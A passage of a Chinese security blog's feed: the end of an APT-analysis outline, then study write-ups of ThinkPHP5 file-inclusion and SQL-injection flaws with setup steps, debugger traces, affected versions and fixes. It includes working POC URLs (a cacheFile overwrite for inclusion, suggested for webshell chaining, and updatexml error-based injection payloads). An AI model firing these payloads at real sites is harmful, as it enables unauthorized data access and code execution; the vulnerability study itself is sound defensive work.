Information Security Offier)</li></ul></li></ul></li><li><p>威胁情报的利用</p><ul><li><p>~在准备阶段、检测与分析阶段、隔离，清除，与恢复阶段、事后复盘阶段的作用</p></li><li><p>安全运营团队会遇到的问题</p><ul><li>如何高效地发现攻击和入侵活动，评估影响面</li><li>如何获取、处置与已经发现安全事件相关的活动</li><li>如何基于对对手的了解、设置各个环节上的安全控制措施、以阻止相同对手或类似攻击手法的入侵</li><li>理解目前安全威胁的全貌、实现有效的安全投资</li></ul></li></ul></li></ul></li><li><p>流量威胁检测技术</p><ul><li>流量威胁分析</li><li>流量日志存储</li><li>威胁回溯分析</li></ul></li><li><p>网络检测响应技术(Network-based Detection and Response,NDR)</p></li><li><p>终端检测响应技术(Endpoint Detection and Response,EDR)</p><ul><li>基于终端大数据分析的新一代终端安全产品，能对终端行为数据进行全面采集、实时上传、对终端进行持续检测和分析、增强对内部威胁事件的深度可见性，结合相关威胁情报中心推送的情报信息(IP、URL、文件Hash等)能帮助企业快速发现，精确定位高级威胁入侵</li></ul></li></ul><h3 id="如何分析APT攻击"><a href="#如何分析APT攻击" class="headerlink" title="如何分析APT攻击"></a>如何分析APT攻击</h3><ul><li><p>网络杀伤链模型(Cyber Kill Chain)</p><ul><li><p>侦察</p><ul><li>攻击者选择目标、进行研究、搜集目标弱点</li></ul></li><li><p>武器化</p><ul><li>攻击者创建针对一个或多个漏洞定制的远程访问恶意程序武器，比如病毒或蠕虫</li></ul></li><li><p>散布</p><ul><li>将网络武器包向目标投放</li></ul></li><li><p>恶用</p><ul><li>在受害者系统上运行代码</li></ul></li><li><p>设置</p><ul><li>在目标位置安装恶意程序</li></ul></li><li><p>命令和控制</p><ul><li>为攻击者建立可远程控制目标系统的路径</li></ul></li><li><p>目标达成</p><ul><li>攻击者远程完成其预期效果</li></ul></li></ul></li><li><p>钻石模型</p><ul><li><p>攻击者</p><ul><li>分清攻击者有利用了解其目的、归属、适应性和持久性</li></ul></li><li><p>能力</p><ul><li>事件中使用的工具或技术</li></ul></li><li><p>基础设施</p><ul><li>攻击者用来传递能力的物理或逻辑结构，如IP地址、域名、邮件地址、USB设备等</li></ul></li><li><p>受害者</p><ul><li>以社会-政治为支点的安全分析中，受害者作用重大</li></ul></li></ul></li><li><p>自适应安全架构(Adaptive Security Architecture,ASA)</p><ul><li>由美国安全公司Gartner于2014年提出的面向未来的下一代安全架构，从预测、防御、检测、响应四个维度，强度安全防护是一个持续处理、循环的过程，是细粒度、多角度、持续化地对安全威胁进行实时动态分析</li><li>目的：为了解决当前企业的安全防护功能难以应对高级定向攻击的问题</li><li>最终效果：达到网络安全的可管、可控、可视、可调度、可持续</li></ul></li></ul><h3 id="协同联动的纵深防御体系"><a href="#协同联动的纵深防御体系" class="headerlink" title="协同联动的纵深防御体系"></a>协同联动的纵深防御体系</h3><ul><li><p>高级安全威胁的判定</p><ul><li>结合多源头威胁情报应用、沙箱动态行为发现、关联引擎分析</li></ul></li><li><p>安全威胁的处置</p><ul><li>NDR与EDR联动</li></ul></li></ul><h2 id="APT攻击技术-趋势"><a href="#APT攻击技术-趋势" class="headerlink" title="APT攻击技术(趋势)"></a>APT攻击技术(趋势)</h2><h3 id="技术越发高超"><a href="#技术越发高超" class="headerlink" title="技术越发高超"></a>技术越发高超</h3><ul><li><p>非PE文件文件攻击</p><ul><li>文件无需长期驻留磁盘</li><li>核心Payload存放在网络或注册表</li><li>通过系统进程执行Payload</li></ul></li><li><p>开源工具和自动化攻击框架</p><ul><li><p>PowerShell自动化攻击框架</p></li><li><p>CobaltStrike</p><ul><li>Shellcode</li><li>Beacon</li></ul></li><li><p>Koadic</p></li></ul></li><li><p>“Living off the land”技术</p></li></ul><h3 id="国际冲突地区的APT攻击更加活跃"><a href="#国际冲突地区的APT攻击更加活跃" class="headerlink" title="国际冲突地区的APT攻击更加活跃"></a>国际冲突地区的APT攻击更加活跃</h3><ul><li>能源资源、工业、持有不同政见者</li><li>这类APT组织：黄金鼠、人面狮、APT33、APT34等</li></ul><h3 id="网络空间已成为大国博弈新战场"><a href="#网络空间已成为大国博弈新战场" class="headerlink" title="网络空间已成为大国博弈新战场"></a>网络空间已成为大国博弈新战场</h3><ul><li>影响面：政治、经济、军事谈判等</li></ul><h3 id="针对基础设施的破坏性攻击日益活跃"><a href="#针对基础设施的破坏性攻击日益活跃" class="headerlink" title="针对基础设施的破坏性攻击日益活跃"></a>针对基础设施的破坏性攻击日益活跃</h3><ul><li>“互联网+”、5G、万物互联等新兴技术的兴起</li><li>涉及行业：能源、交通、制造、金融、通信等领域</li><li>现状：很多基础设施和生产系统的网络安全体系建设还基本为零</li></ul><h3 id="针对个人移动终端攻击显著增加"><a href="#针对个人移动终端攻击显著增加" class="headerlink" title="针对个人移动终端攻击显著增加"></a>针对个人移动终端攻击显著增加</h3><ul><li>iOS、Android</li><li>系统漏洞、社会工程学</li><li>典型例子：“三叉戟漏洞”</li></ul><h2 id="典型的APT组织机构"><a href="#典型的APT组织机构" class="headerlink" title="典型的APT组织机构"></a>典型的APT组织机构</h2><h3 id="方程式"><a href="#方程式" class="headerlink" title="方程式"></a>方程式</h3><h3 id="索伦之眼"><a href="#索伦之眼" class="headerlink" title="索伦之眼"></a>索伦之眼</h3><h3 id="APT28"><a href="#APT28" class="headerlink" title="APT28"></a>APT28</h3><h3 id="Lazarus"><a href="#Lazarus" class="headerlink" title="Lazarus"></a>Lazarus</h3><h3 id="Group123"><a href="#Group123" class="headerlink" title="Group123"></a>Group123</h3><h2 id="当然还有很多系统级别的漏洞，这里为什么经常用到的都是Office相关的，我个人认为是APT需要前期大量的鱼叉攻击来获取真实的目标信息，而Office在大部分攻击目标的机器上应该都有，作用范围比较大，成功率高的原因吧。"><a href="#当然还有很多系统级别的漏洞，这里为什么经常用到的都是Office相关的，我个人认为是APT需要前期大量的鱼叉攻击来获取真实的目标信息，而Office在大部分攻击目标的机器上应该都有，作用范围比较大，成功率高的原因吧。" class="headerlink" title="当然还有很多系统级别的漏洞，这里为什么经常用到的都是Office相关的，我个人认为是APT需要前期大量的鱼叉攻击来获取真实的目标信息，而Office在大部分攻击目标的机器上应该都有，作用范围比较大，成功率高的原因吧。"></a>当然还有很多系统级别的漏洞，这里为什么经常用到的都是Office相关的，我个人认为是APT需要前期大量的鱼叉攻击来获取真实的目标信息，而Office在大部分攻击目标的机器上应该都有，作用范围比较大，成功率高的原因吧。</h2><p><em>XMind - Trial Version</em></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;img src=&quot;https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200922011215.png&quot;&gt;&lt;/p&gt;
&lt;h1 id=&quot;《透视APT》&quot;&gt;&lt;a href=&quot;#《透视APT》&quot; class=&quot;hea</summary>
      
    
    
    
    
    <category term="APT" scheme="https://hack-for.fun/tags/APT/"/>
    
  </entry>
  
  <entry>
    <title>ThinkPHP5漏洞学习-文件包含漏洞</title>
    <link href="https://hack-for.fun/8d0f.html"/>
    <id>https://hack-for.fun/8d0f.html</id>
    <published>2020-09-16T05:10:50.000Z</published>
    <updated>2020-09-16T15:59:09.731Z</updated>
    
    <content type="html"><![CDATA[<p>[toc]</p><h2 id="ThinkPHP5文件包含漏洞"><a href="#ThinkPHP5文件包含漏洞" class="headerlink" title="ThinkPHP5文件包含漏洞"></a>ThinkPHP5文件包含漏洞</h2><h2 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;public&#x2F;index.php&#x2F;index&#x2F;index?cacheFile&#x3D;favicon.ico</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200916231827.png" alt="image-20200916135216791"></p><p>可配合文件上传图片马，GetShell。(PHP 文件包含都讲文件当做php后缀文件进行解析，与实际文件类型无关)</p><h2 id="漏洞概述"><a href="#漏洞概述" class="headerlink" title="漏洞概述"></a>漏洞概述</h2><p>漏洞存在于 <strong>ThinkPHP</strong> 模板引擎中，在加载模版解析变量时存在<strong>变量覆盖</strong>问题，而且程序没有对数据进行很好的过滤，最终导致 <strong>文件包含漏洞</strong> 的产生。</p><ul><li>变量覆盖漏洞</li></ul><p><a href="https://www.cnblogs.com/wangtanzhi/p/12748967.html">https://www.cnblogs.com/wangtanzhi/p/12748967.html</a></p><p><strong>如果没有指定 flags，则被假定为 EXTR_OVERWRITE。</strong></p><p>代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">$auth = <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">extract($_GET)；</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($auth==<span class="number">1</span>)&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;private!&quot;</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;public!&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><strong>这种情况没有指定 flags，则被假定为 EXTR_OVERWRITE</strong></p><p>假设用户构造以下链接：<a href="http://www.a.com/test1.php?auth=1">http://www.a.com/test1.php?auth=1</a><br>界面上会打印出private！</p><p>安全的做法是确定register_globals=OFF后，在调用extract()时使用EXTR_SKIP保证已有变量不会被覆盖。<br>ps:<br>PHP extract() 函数从数组中把变量导入到当前的符号表中。对于数组中的每个元素，键名用于变量名，键值用于变量值。</p><h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><p><strong>5.0.0&lt;=ThinkPHP5&lt;=5.0.18</strong> 、<strong>5.1.0&lt;=ThinkPHP&lt;=5.1.10</strong> </p><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>这里以<code>ThinkPHP 5.0.18</code>  进行分析。</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200916184327.png" alt="image-20200916153529187"></p><p>在历史<code>Releases</code> 信息中，找到了 <code>5.0.19</code> 中，改进了 模板引擎的一处可能的安全隐患。</p><p><code>/library/think/template/driver/File.php</code> 中的 <code>File</code> 类中的<code>read</code> 方法。</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200916185031.png" alt="image-20200916161144712"></p><ul><li>用户Get提交的数据都会通过<code>input</code> 方法获取数据，然后通过<code>filterValue</code> 方法进行过滤和强制类型转换。</li><li>在修改后的代码下断点，然后看方法调用和参数传递。如下图：</li></ul><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200916185043.png" alt="image-20200916163325855"></p><p>在<code>../application/index/index/controller/index.php</code> 中，代码如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">app</span>\<span class="title">index</span>\<span class="title">controller</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">Controller</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Index</span> <span class="keyword">extends</span> <span class="title">Controller</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;assign(request()-&gt;get());</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;fetch(); <span class="comment">// 当前模块/默认视图目录/当前控制器（小写）/当前操作（小写）.html</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>用户输入的数据被<code>get</code>方法获取，然后调用了<code>input</code>方法和递归调用<code>filterValue</code> 方法，并且该方法还会继续调用<code>filterExp</code> 方法对特殊字符进行过滤，然后返回给<code>$data</code></p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200916185108.png" alt="image-20200916165017001"></p><p>然后再调用<code>assign</code> 方法，返回处理后的数据。</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200916185121.png" alt="image-20200916171205436"></p><p>因此用户的数据输入，经过<code>get</code>方法和<code>assign</code>方法后，返回的内容为<code>cacheFile=favico.ico</code> ，然后程序继续调用<code>fetch</code>方法进行处理。</p><blockquote><p>fetch方法用于加载模板输出。这里如果我们没有指定模板名称，其会使用默认的文件作为模板，模板路径类似 <strong>当前模块/默认视图目录/当前控制器（小写）/当前操作（小写）.html</strong> ，如果默认路径模板不存在，程序就会报错。</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200916185135.png" alt="image-20200916183120261"></p><p>跟进到 <strong>Template</strong> 类的 <strong>fetch</strong> 方法，可以发现可控变量 <strong>$vars</strong> 赋值给 <strong>$this-&gt;data</strong> 并最终传入 <strong>File</strong> 类的 <strong>read</strong> 方法。而 <strong>read</strong> 方法中在使用了 <strong>extract</strong> 函数后，直接包含了 <strong>$cacheFile</strong> 变量。这里就是漏洞发生的关键原因（可以通过 <strong>extract</strong> 函数，直接覆盖 <strong>$cacheFile</strong> 变量，因为 <strong>extract</strong> 函数中的参数 <strong>$vars</strong> 可以由用户控制）。</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200916185154.png" alt="image-20200916184005912"></p><p>方法调用栈：</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200916185205.png" alt="image-20200916184215051"></p><h2 id="利用总结"><a href="#利用总结" class="headerlink" title="利用总结"></a>利用总结</h2><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200916185135.png" alt="image-20200916183120261"></p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200916185825.png" alt="7"></p><h2 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h2><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200916185031.png" alt="image-20200916161144712"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;[toc]&lt;/p&gt;
&lt;h2 id=&quot;ThinkPHP5文件包含漏洞&quot;&gt;&lt;a href=&quot;#ThinkPHP5文件包含漏洞&quot; class=&quot;headerlink&quot; title=&quot;ThinkPHP5文件包含漏洞&quot;&gt;&lt;/a&gt;ThinkPHP5文件包含漏洞&lt;/h2&gt;&lt;h2 id=&quot;</summary>
      
    
    
    
    
    <category term="代码审计" scheme="https://hack-for.fun/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    <category term="文件包含" scheme="https://hack-for.fun/tags/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"/>
    
  </entry>
  
  <entry>
    <title>ThinkPHP5漏洞学习-SQL注入</title>
    <link href="https://hack-for.fun/69fea760.html"/>
    <id>https://hack-for.fun/69fea760.html</id>
    <published>2020-09-13T05:40:27.000Z</published>
    <updated>2020-09-23T03:04:24.409Z</updated>
    
    <content type="html"><![CDATA[<p>[toc]</p><p>参考资料：<a href="https://github.com/Mochazz/ThinkPHP-Vuln">https://github.com/Mochazz/ThinkPHP-Vuln</a></p><p>环境准备：</p><ul><li>PHPStorm + MAMP PRO</li></ul><p>环境搭建可以看我前两篇文章。</p><ul><li>composer</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">brew install composer</span><br><span class="line">composer config -g repo.packagist composer https:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;composer&#x2F;</span><br></pre></td></tr></table></figure><ul><li>获取复现代码</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">composer create-project --prefer-dist topthink&#x2F;think&#x3D;5.0.15 tpdemo</span><br></pre></td></tr></table></figure><p>将 <strong>composer.json</strong> 文件的 <strong>require</strong> 字段设置成如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&quot;require&quot;: &#123;</span><br><span class="line">    &quot;php&quot;: &quot;&gt;&#x3D;5.4.0&quot;,</span><br><span class="line">    &quot;topthink&#x2F;framework&quot;: &quot;5.0.15&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>SQL 注入demo 环境</li></ul><p>修改<code>/application/index/controller/index.php</code> 的代码如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">app</span>\<span class="title">index</span>\<span class="title">controller</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Index</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $username = request()-&gt;get(<span class="string">&#x27;username/a&#x27;</span>);</span><br><span class="line">        db(<span class="string">&#x27;users&#x27;</span>)-&gt;insert([<span class="string">&#x27;username&#x27;</span> =&gt; $username]);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;Update success&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>模拟这里存在一个用户传参并与数据库交互的场景。</p></blockquote><p>可能会存在，SQL 报错</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200913191229.png" alt="image-20200913135221064"></p><p>修改username 字段默认为<code>NULL</code>  即可解决问题。</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200913191250.png" alt="image-20200913134825568"></p><h1 id="SQL注入一-insert"><a href="#SQL注入一-insert" class="headerlink" title="SQL注入一(insert)"></a>SQL注入一(insert)</h1><h2 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">public&#x2F;index&#x2F;index?username[0]&#x3D;inc&amp;username[1]&#x3D;updatexml(1,concat(0x7,user(),0x7e),1)&amp;username[2]&#x3D;1 </span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200913191832.png" alt="image-20200913134332556"></p><h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><p><strong>5.0.13&lt;=ThinkPHP&lt;=5.0.15</strong> 、 <strong>5.1.0&lt;=ThinkPHP&lt;=5.1.5</strong></p><h2 id="漏洞概述"><a href="#漏洞概述" class="headerlink" title="漏洞概述"></a>漏洞概述</h2><p>本次漏洞存在于 <strong>Builder</strong> 类的 <strong>parseData</strong> 方法中。由于程序没有对数据进行很好的过滤，将数据拼接进 <strong>SQL</strong> 语句，导致 <strong>SQL注入漏洞</strong> 的产生。</p><p>类型：<code>insert</code> 注入。</p><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><blockquote><p>对于开源项目，在issue 或者 commit \ Releases 记录中，就能找到历史漏洞信息。这一点在CTF中经常用到，尤其是Node.js 的第三方依赖漏洞。</p></blockquote><p>从漏洞影响版本可以去找 已经修复后的版本，<a href="https://github.com/top-think/framework/releases/tag/v5.0.16">https://github.com/top-think/framework/releases/tag/v5.0.16</a></p><p>通过github 的<code>compare</code>功能，即可查看代码发生了哪些修改。</p><p><a href="https://github.com/top-think/framework/compare/v5.0.16...master">https://github.com/top-think/framework/compare/v5.0.16...master</a></p><p>在<code>/thinkphp/library/think/db/Connection.php</code> 的 314， 316 行下断点Debug，打payload。</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200913191848.png" alt="image-20200913141903209"></p><p>INSERT INTO <code>users</code> (<code>username</code>) VALUES (updatexml(1,concat(0x7,user(),0x7e),1)+1) </p><p>同时成功攻击的Payload 所在的参数位于 <code>username[1]</code> 的 <code>value</code>  。</p><p>攻击Payload 经过ThinkPHP 的内置过滤后，进入<code>$this-&gt;builder</code> 的<code>Query</code> 类的<code>insert</code> 方法，执行其中的SQL语句，并在后面返回出了执行结果。因为Payload利用<code>updatexml()</code>来报错，因此必须开启<code>app_debug</code> 来开启SQL 报错信息。</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200913192007.png" alt="image-20200913155142684"></p><p>(如上图debug 结果中Query.php），<code>$this-&gt;builder</code> 为 <code>think\db\builder\Mysql</code> 类，<code>Query</code> 的定义位于 <code>thinkphp/library/think/db/builder/Mysql.php</code> </p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200913192026.png" alt="image-20200913161424839"></p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200913192043.png" alt="image-20200913161552092"></p><p>在<code>/thinkphp/library/think/db/builder/Mysql.php</code> , <code>Mysql</code> 类继承于<code>Builder</code> 类，即上面的 <strong>$this-&gt;builder-&gt;insert()</strong> 最终调用的是 <strong>Builder</strong> 类的 <strong>insert</strong> 方法</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200913192059.png" alt="image-20200913162209236"></p><p>方法调用<code>parseData()</code>方法来分析并处理数据，跟进该方法。</p><p><code>/thinkphp/library/think/db/Builder.php</code> </p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200913193005.png" alt="image-20200913163148214"></p><p>在<code>inc</code> 和 <code>dec</code> 的 情况下，将可控数据<code>$val[1]</code>通过<code>parseKey</code>方法处理后，进行拼接，并返回<code>$result</code></p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200913192945.png" alt="image-20200913185951795"></p><p><code>parseKey</code>方法 不做任何处理，是直接返回值的一个方法。</p><blockquote><p>因此，带有恶意SQL 语句的Payload，被拼接且没任何字符串形式处理在Builder类的insert方法中，通过str_replace函数直接替换，返回sql，带入SQL语句中被执行，造成了SQL注入漏洞。</p></blockquote><p>在<code>thinkphp/library/think/Request.php</code> 中，有调用内置过滤（直接替换为空）方法，对参数<code>exp</code>进行过滤，在case <code>exp</code>的情况下，无法造成漏洞。</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200913192928.png" alt="carbon"></p><p>问题：为什么不能将恶意Payload 用<code>username[2]</code> 来投递？</p><p>原因：</p><p>同样的办法，下断点，debug 可以看到。</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200913192915.png" alt="image-20200913181025221"></p><p>回到之前的<code>parseDate</code> 方法，<code>username[2]</code>的值通过<code>floatval</code>函数处理</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200913192902.png" alt="image-20200913171023035"></p><p>payload 变为了<code>0</code> ，且 会存在SQL 错误。</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200913192852.png" alt="image-20200913182241348"></p><h2 id="利用总结"><a href="#利用总结" class="headerlink" title="利用总结"></a>利用总结</h2><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200913192749.png" alt="image-20200913185834897"></p><h2 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h2><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200913192803.png" alt="image-20200913151252661"></p><h1 id="SQL注入二-update"><a href="#SQL注入二-update" class="headerlink" title="SQL注入二(update)"></a>SQL注入二(update)</h1><p>复现代码获取：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">composer create-project --prefer-dist topthink&#x2F;think&#x3D;5.1  tpdemo3</span><br></pre></td></tr></table></figure><p>将 <strong>composer.json</strong> 文件的 <strong>require</strong> 字段设置成如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&quot;require&quot;: &#123;</span><br><span class="line">    &quot;php&quot;: &quot;&gt;&#x3D;5.6.0&quot;,</span><br><span class="line">    &quot;topthink&#x2F;framework&quot;: &quot;5.1.7&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在<code>../config/app.php</code> 中，需要修改<code>app_trace</code> 为true， <code>app_debug</code> 默认开启了。</p><p>创建数据库：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">create database tpdemo;</span><br><span class="line">use tpdemo;</span><br><span class="line">create table users(</span><br><span class="line">id int primary key auto_increment,</span><br><span class="line">username varchar(50) not null</span><br><span class="line">);</span><br><span class="line">insert into users(id,username) values(1,&#39;testuser&#39;);</span><br></pre></td></tr></table></figure><p>这里也要设置username 字段 为<code>NULL</code> 才行</p><p>修改<code>/application/index/controller/index.php</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">app</span>\<span class="title">index</span>\<span class="title">controller</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Index</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $username = request()-&gt;get(<span class="string">&#x27;username/a&#x27;</span>);</span><br><span class="line">        db(<span class="string">&#x27;users&#x27;</span>)-&gt;where([<span class="string">&#x27;id&#x27;</span> =&gt; <span class="number">1</span>])-&gt;update([<span class="string">&#x27;username&#x27;</span> =&gt; $username]);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;Update success&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="POC-1"><a href="#POC-1" class="headerlink" title="POC"></a>POC</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;public&#x2F;index&#x2F;index?username[0]&#x3D;point&amp;username[1]&#x3D;1&amp;username[2]&#x3D;updatexml(1,concat(0x7,user(),0x7e),1)^&amp;username[3]&#x3D;0</span><br></pre></td></tr></table></figure><p>很SQL 注入一非常类似。</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200914203133.png" alt="image-20200914152750668"></p><h2 id="影响版本-1"><a href="#影响版本-1" class="headerlink" title="影响版本"></a>影响版本</h2><p>漏洞影响版本： <strong>5.1.6&lt;=ThinkPHP&lt;=5.1.7</strong> (非最新的 <strong>5.1.8</strong> 版本也可利用)。</p><h2 id="漏洞概述-1"><a href="#漏洞概述-1" class="headerlink" title="漏洞概述"></a>漏洞概述</h2><p>本次漏洞存在于 <strong>Mysql</strong> 类的 <strong>parseArrayData</strong> 方法中由于程序没有对数据进行很好的过滤，将数据拼接进 <strong>SQL</strong> 语句，导致 <strong>SQL注入漏洞</strong> 的产生</p><p>注入类型：<code>update</code> 注入</p><h2 id="漏洞分析-1"><a href="#漏洞分析-1" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><blockquote><p>对于开源项目，在issue 或者 commit \ Releases 记录中，就能找到历史漏洞信息。这一点在CTF中经常用到，尤其是Node.js 的第三方依赖漏洞。</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200914203118.png" alt="image-20200914161022479"></p><ul><li>下断点，debug。观察参数传递过程</li><li>监控MySQL</li></ul><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200914203111.png" alt="image-20200914184917592"></p><hr><p>下断点，开启Debug，打Payload。</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200914202218.png" 